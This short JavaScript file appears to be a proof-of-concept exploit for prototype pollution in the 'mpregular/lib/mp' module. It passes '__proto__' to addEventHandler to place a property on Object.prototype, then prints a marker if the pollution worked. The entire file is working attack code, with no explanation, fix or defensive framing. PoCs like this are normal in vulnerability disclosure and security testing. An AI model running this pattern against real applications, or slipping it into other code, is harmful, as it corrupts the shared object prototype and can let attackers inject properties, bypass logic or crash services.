// Define a dummy handler function
const handler = () => {
  console.log('Handler called');
};

// Add event handler with a polluted prototype
require('mpregular/lib/mp').addEventHandler('__proto__', 'pollutedProperty', handler);

// Verify the exploit
console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'');